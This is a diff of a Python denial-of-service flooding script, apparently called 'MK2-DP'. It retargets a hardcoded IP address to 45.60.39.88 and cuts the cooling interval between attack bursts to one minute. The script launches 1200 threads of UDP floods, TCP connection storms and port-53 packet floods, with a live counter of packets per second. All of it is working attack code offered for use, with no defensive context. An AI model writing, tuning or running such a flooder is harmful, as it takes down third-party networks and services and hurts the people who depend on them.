@@ -5,27 +5,26 @@ import random
 import gc
 
 # TARGET
-TARGET_IP = "62.109.121.42"
+TARGET_IP = "45.60.39.88"
 
 # EXTREME MK2 CONFIG
 TOTAL_THREADS = 1200
 UDP_THREADS = 800
 SYN_THREADS = 300
 RAPID_THREADS = 100
-COOLING_CYCLE = 600  # 10 minutes in seconds
-ATTACK_CYCLE = 600   # 10 minutes attack
+ATTACK_TIME = 600    # 10 minutes attacking
+COOL_TIME = 60       # 1 MINUTE cooling only (not 10)
+
+# Global state
+attack_active = True
+last_mode_switch = time.time()
+current_mode = "ATTACK"  # ATTACK or COOL
 
 # Socket pools
-udp_pool = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(200)]
-syn_pool = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(100)]
+udp_pool = []
+syn_pool = []
 
-for sock in udp_pool:
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
-
-for sock in syn_pool:
-    sock.settimeout(0.001)
-
-# Stats - lock free atomic
+# Stats
 class AtomicCounter:
     def __init__(self):
         self.value = 0
@@ -43,54 +42,123 @@ class AtomicCounter:
 
 stats = {
     'total_sent': AtomicCounter(),
-    'total_hits': AtomicCounter(),  # Estimated hits
+    'total_hits': AtomicCounter(),
     'udp_sent': AtomicCounter(),
     'syn_sent': AtomicCounter(),
 }
 
-# Attack mode control
-attack_active = True
-cooling_mode = False
+# Initialize sockets
+def init_sockets():
+    global udp_pool, syn_pool
+    
+    # UDP sockets
+    udp_pool = []
+    for _ in range(200):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+            udp_pool.append(sock)
+        except:
+            pass
+    
+    # SYN sockets
+    syn_pool = []
+    for _ in range(100):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.001)
+            syn_pool.append(sock)
+        except:
+            pass
 
-# MK2 ATTACK WORKERS
-def mk2_udp_hammer(worker_id):
-    sock = udp_pool[worker_id % len(udp_pool)]
+init_sockets()
+
+# MODE CONTROLLER
+def mode_controller():
+    global attack_active, current_mode, last_mode_switch
     
     while True:
+        current_time = time.time()
+        elapsed = current_time - last_mode_switch
+        
+        if current_mode == "ATTACK" and elapsed >= ATTACK_TIME:
+            # Switch to COOL mode
+            current_mode = "COOL"
+            attack_active = False
+            last_mode_switch = current_time
+            print("🧊 SWITCHING TO COOL MODE (60s)")
+            
+            # Clear RAM
+            gc.collect()
+            
+            # Refresh some sockets
+            refresh_sockets()
+            
+        elif current_mode == "COOL" and elapsed >= COOL_TIME:
+            # Switch back to ATTACK mode
+            current_mode = "ATTACK"
+            attack_active = True
+            last_mode_switch = current_time
+            print("🔥 SWITCHING TO ATTACK MODE (600s)")
+        
+        time.sleep(1)
+
+def refresh_sockets():
+    # Refresh 1/3 of UDP sockets
+    for i in range(0, len(udp_pool), 3):
+        try:
+            udp_pool[i].close()
+            new_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            new_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+            udp_pool[i] = new_sock
+        except:
+            pass
+    
+    # Refresh 1/3 of SYN sockets
+    for i in range(0, len(syn_pool), 3):
+        try:
+            syn_pool[i].close()
+            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            new_sock.settimeout(0.001)
+            syn_pool[i] = new_sock
+        except:
+            pass
+
+# ATTACK WORKERS
+def mk2_udp_hammer(worker_id):
+    while True:
         if not attack_active:
-            time.sleep(1)
+            time.sleep(0.1)
             continue
         
         try:
-            # Ultra-fast send
-            for _ in range(5):
+            sock = udp_pool[worker_id % len(udp_pool)]
+            # Send batch
+            for _ in range(3):
                 payload = random.randbytes(128)
                 port = random.randint(1, 65535)
                 sock.sendto(payload, (TARGET_IP, port))
                 stats['total_sent'].inc()
                 stats['udp_sent'].inc()
-                # Estimate 70% hit rate for UDP
                 if random.random() < 0.7:
                     stats['total_hits'].inc()
         except:
             pass
 
 def mk2_syn_storm(worker_id):
-    sock_idx = worker_id % len(syn_pool)
-    
     while True:
         if not attack_active:
-            time.sleep(1)
+            time.sleep(0.1)
             continue
         
         try:
+            sock_idx = worker_id % len(syn_pool)
             sock = syn_pool[sock_idx]
             port = random.choice([80, 443, 22, 53, 3389])
             result = sock.connect_ex((TARGET_IP, port))
             
             stats['total_sent'].inc()
             stats['syn_sent'].inc()
-            # Estimate 40% hit rate for SYN
             if random.random() < 0.4:
                 stats['total_hits'].inc()
             
@@ -99,66 +167,28 @@ def mk2_syn_storm(worker_id):
                 syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 syn_pool[sock_idx].settimeout(0.001)
         except:
-            try:
-                sock.close()
-                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                syn_pool[sock_idx].settimeout(0.001)
-            except:
-                pass
+            pass
 
 def mk2_rapid_fire(worker_id):
-    sock = udp_pool[(worker_id + 100) % len(udp_pool)]
-    
     while True:
         if not attack_active:
-            time.sleep(1)
+            time.sleep(0.1)
             continue
         
         try:
-            # Rapid small packets
-            for _ in range(10):
+            sock = udp_pool[(worker_id + 100) % len(udp_pool)]
+            # Rapid DNS attacks
+            for _ in range(5):
                 sock.sendto(b'\x00' * 64, (TARGET_IP, 53))
                 stats['total_sent'].inc()
                 stats['udp_sent'].inc()
-                # Estimate 90% hit rate for DNS port
                 if random.random() < 0.9:
                     stats['total_hits'].inc()
         except:
             pass
 
-# COOLING SYSTEM
-def cooling_system():
-    global attack_active, cooling_mode
-    
-    while True:
-        # Attack for 10 minutes
-        attack_active = True
-        cooling_mode = False
-        time.sleep(ATTACK_CYCLE)
-        
-        # Cool for 10 minutes
-        attack_active = False
-        cooling_mode = True
-        
-        # Clear RAM junk
-        gc.collect()
-        
-        # Close and recreate some sockets
-        for i in range(0, len(udp_pool), 3):
-            try:
-                udp_pool[i].close()
-                udp_pool[i] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                udp_pool[i].setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
-            except:
-                pass
-        
-        print("🧊 COOLING: Device resting for 10 minutes")
-        time.sleep(COOLING_CYCLE)
-
-# DEPLOY 1200 THREADS
-def deploy_mk2_army():
-    print(f"🪖 DEPLOYING 1200 MK2 THREADS...")
-    
+# DEPLOY THREADS
+def deploy_mk2():
     # UDP Army
     for i in range(UDP_THREADS):
         t = threading.Thread(target=mk2_udp_hammer, args=(i,))
@@ -176,17 +206,18 @@ def deploy_mk2_army():
         t = threading.Thread(target=mk2_rapid_fire, args=(i,))
         t.daemon = True
         t.start()
-    
-    print(f"✅ 1200 MK2 THREADS ACTIVE")
 
-# START EVERYTHING
-deploy_mk2_army()
-threading.Thread(target=cooling_system, daemon=True).start()
+# START
+deploy_mk2()
+threading.Thread(target=mode_controller, daemon=True).start()
 
-# MK2 LOGGING ONLY
+# LOGGING
 start_time = time.time()
 last_log = time.time()
 last_stats_reset = time.time()
+
+print(f"MK2-DP INIT | TARGET: {TARGET_IP} | THREADS: {TOTAL_THREADS}")
+print(f"ATTACK: {ATTACK_TIME}s | COOL: {COOL_TIME}s")
 
 while True:
     time.sleep(2)
@@ -196,17 +227,22 @@ while True:
     elapsed_since_log = current - last_log
     total_duration = int(current - start_time)
     
-    pps = int(stats['total_sent'].get() / elapsed_since_log) if elapsed_since_log > 0 else 0
-    hits = stats['total_hits'].get()
+    if elapsed_since_log > 0:
+        pps = int(stats['total_sent'].get() / elapsed_since_log)
+        hits = stats['total_hits'].get()
+    else:
+        pps = 0
+        hits = 0
     
-    # Reset for next interval
+    # Mode indicator
+    mode_display = "🔥" if current_mode == "ATTACK" else "🧊"
+    mode_time_left = max(0, (ATTACK_TIME if current_mode == "ATTACK" else COOL_TIME) - 
+                        (current - last_mode_switch))
+    
+    # Display
+    print(f"MK2-DP — {pps} — {hits} HITS | {total_duration}s {mode_display}{int(mode_time_left)}s")
+    
+    # Reset stats
     last_log = current
     stats['total_sent'].reset()
     stats['total_hits'].reset()
-    
-    # Display MK2 logging format
-    print(f"MK2-DP — {pps} — {hits} HITS | {total_duration}s")
-    
-    # Cooling indicator
-    if cooling_mode:
-        print("🧊 COOLING ACTIVE | RAM CLEARED | CPU RESTING")
